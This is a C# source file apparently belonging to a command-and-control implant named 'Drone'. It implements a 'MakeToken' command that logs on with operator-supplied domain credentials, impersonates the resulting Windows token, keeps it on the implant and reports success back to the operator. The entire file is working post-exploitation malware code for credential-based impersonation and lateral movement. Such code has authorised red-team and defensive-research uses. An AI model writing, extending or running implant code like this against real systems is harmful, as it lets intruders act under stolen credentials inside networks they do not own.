using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class MakeToken : DroneCommand
{
    public override byte Command => 0x14;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var userDomain = task.Arguments[0].Split('\\');
            
        var domain = userDomain[0];
        var username = userDomain[1];
        var password = task.Arguments[1];

        // create token
        var hToken = Win32.LogonUserW(
            username,
            domain,
            password,
            Win32.LOGON_USER_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
            Win32.LOGON_USER_PROVIDER.LOGON32_PROVIDER_DEFAULT);

        if (hToken == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        // revert first
        Win32.RevertToSelf();
        
        // impersonate token
        var success = Win32.ImpersonateToken(hToken);

        if (!success)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        await Drone.SendOutput(task, $"Impersonated token for {domain}\\{username}.");
        
        // set token on drone
        Drone.ImpersonationToken = hToken;
    }
}